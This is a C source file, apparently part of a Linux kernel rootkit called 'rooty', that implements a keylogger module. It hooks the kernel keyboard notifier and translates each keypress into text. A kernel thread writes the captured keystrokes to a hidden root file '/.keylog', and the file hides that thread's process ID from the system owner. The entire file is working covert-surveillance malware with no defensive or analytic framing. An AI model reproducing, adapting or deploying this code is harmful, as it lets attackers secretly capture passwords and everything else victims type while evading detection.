#define FLUSHSIZE 16
#define LOGSIZE   128
#define LOG_FILE "/.keylog"

unsigned long sequence_i = 0;

DECLARE_WAIT_QUEUE_HEAD(flush_event);

struct task_struct *log_ts;
struct file *logfile;
volatile unsigned long to_flush = 0;
unsigned long logidx = 0;
char logbuf[LOGSIZE];


static void ksym_std ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned char val = param->value & 0xff;
    unsigned long len;

    //printk("rooty: KEYLOGGER: ksym_std: %s\n", ascii[val]);

    len = strlcpy(&logbuf[logidx], ascii[val], LOGSIZE - logidx);

    logidx += len;
}


static void ksym_fnc ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned char val = param->value & 0xff;
    unsigned long len;

    if ( val & 0xf0 )
    {
        len = strlcpy(&logbuf[logidx], upper[val & 0x0f], LOGSIZE - logidx);
        //printk("rooty: KEYLOGGER: ksym_fnc: %s\n",upper[val & 0x0f]);
    }
    else
    {
        len = strlcpy(&logbuf[logidx], fncs[val], LOGSIZE - logidx);
        //printk("rooty: KEYLOGGER: ksym_loc: %s\n",fncs[val]);
    }

    logidx += len;
}

static void ksym_loc ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned long len;
    unsigned char val = param->value & 0xff;
    //printk("rooty: KEYLOGGER: ksym_loc: %s\n",locpad[val]);
    len = strlcpy(&logbuf[logidx], locpad[val], LOGSIZE - logidx);

    logidx += len;
}

static void ksym_num ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned long len;
    unsigned char val = param->value & 0xff;
    //printk("rooty: KEYLOGGER: ksym_num: %s\n",numpad[val]);
    len = strlcpy(&logbuf[logidx], numpad[val], LOGSIZE - logidx);

    logidx += len;
}

static void ksym_arw ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned long len;
    unsigned char val = param->value & 0xff;
    //printk("rooty: KEYLOGGER: ksym_arw: %s\n",arrows[val]);
    len = strlcpy(&logbuf[logidx], arrows[val], LOGSIZE - logidx);
    logidx += len;
}

static void ksym_mod ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned long len;
    unsigned char val = param->value & 0xff;
    //printk("rooty: KEYLOGGER: ksym_mod: %s\n",mod[val]);
    len = strlcpy(&logbuf[logidx], arrows[val], LOGSIZE - logidx);
    logidx += len;
}

static void ksym_cap ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned long len;
    //printk("rooty: KEYLOGGER: ksym_cap: <CAPSLOCK>\n");
    len = strlcpy(&logbuf[logidx], "<CAPSLOCK>", LOGSIZE - logidx);
    logidx += len;
}

void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned char type = (param->value >> 8) & 0x0f;

    if ( logidx >= LOGSIZE )
    {
        printk("rooty: KEYLOGGER: Failed to log key, buffer is full\n");
        return;
    }

    switch ( type )
    {
    case 0x0:
        ksym_std(param, buf);
        break;

    case 0x1:
        ksym_fnc(param, buf);
        break;

    case 0x2:
        ksym_loc(param, buf);
        break;

    case 0x3:
        ksym_num(param, buf);
        break;

    case 0x6:
        ksym_arw(param, buf);
        break;

    case 0x7:
        ksym_mod(param, buf);
        break;

    case 0xa:
        ksym_cap(param, buf);
        break;

    case 0xb:
        ksym_std(param, buf);
        break;
    }

    if ( logidx >= FLUSHSIZE && to_flush == 0 )
    {
        to_flush = 1;
        wake_up_interruptible(&flush_event);
    }
}

int flusher ( void *data )
{
    loff_t pos = 0;
    mm_segment_t old_fs;
    ssize_t ret;

    while (1)
    {
        wait_event_interruptible(flush_event, (to_flush == 1) || kthread_should_stop());
        if(kthread_should_stop())
			return 0;
        if (logfile)
        {
            old_fs = get_fs();
            set_fs(get_ds());
            ret = vfs_write(logfile, logbuf, logidx, &pos);
            set_fs(old_fs);
        }
        to_flush = 0;
        logidx = 0;
    }

    return 0;
}

int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
{
    struct keyboard_notifier_param *param = _param;
    if ( logfile && param->down )
    {
        switch ( code )
        {
        case KBD_KEYCODE:
            break;

        case KBD_UNBOUND_KEYCODE:
        case KBD_UNICODE:
            break;

        case KBD_KEYSYM:
            translate_keysym(param, logbuf);
            break;

        case KBD_POST_KEYSYM:
            break;

        default:
            printk("rooty: KEYLOGGER: Received unknown code: %lu\n",code);
            break;
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block nb =
{
    .notifier_call = notify
};

void init_keylogger(void)
{
    printk("rooty: Installing keyboard sniffer\n");

    register_keyboard_notifier(&nb);

    logfile = filp_open(LOG_FILE, O_WRONLY|O_APPEND|O_CREAT, S_IRWXU);
    if ( ! logfile )
        printk("rooty: KEYLOGGER: Failed to open log file: %s", LOG_FILE);

    log_ts = kthread_run(flusher, NULL, "kthread");
    hide_proc(log_ts->pid);
}

void stop_keylogger(void)
{
    printk("rooty: Uninstalling keyboard sniffer\n");
    unhide_proc(log_ts->pid);
    kthread_stop(log_ts);
	
    if ( logfile )
        filp_close(logfile, NULL);
    unregister_keyboard_notifier(&nb);
}
